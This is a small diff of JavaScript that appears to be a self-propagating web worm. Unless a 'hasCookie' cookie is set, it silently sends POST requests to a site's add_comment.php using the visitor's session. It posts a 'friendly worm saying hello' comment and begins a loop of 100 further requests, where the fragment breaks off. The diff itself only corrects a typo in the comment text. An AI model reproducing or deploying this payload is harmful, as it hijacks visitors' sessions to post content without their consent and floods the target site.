@@ -3,7 +3,7 @@ const cookie = new URLSearchParams(document.cookie.replaceAll("; ","&"));
 if (cookie.get("hasCookie") != "true") {
 	var request = new XMLHttpRequest();
 	var date = new Date();
-	request.open("POST", `/add_comment.php?id=92&comment=Just a friendly work saying hello :) `+date, true);
+	request.open("POST", `/add_comment.php?id=92&comment=Just a friendly worm saying hello :) `+date, true);
 	request.send();
 	for (var i = 0; i < 100; i++) {	
 		var request2 = new XMLHttpRequest();
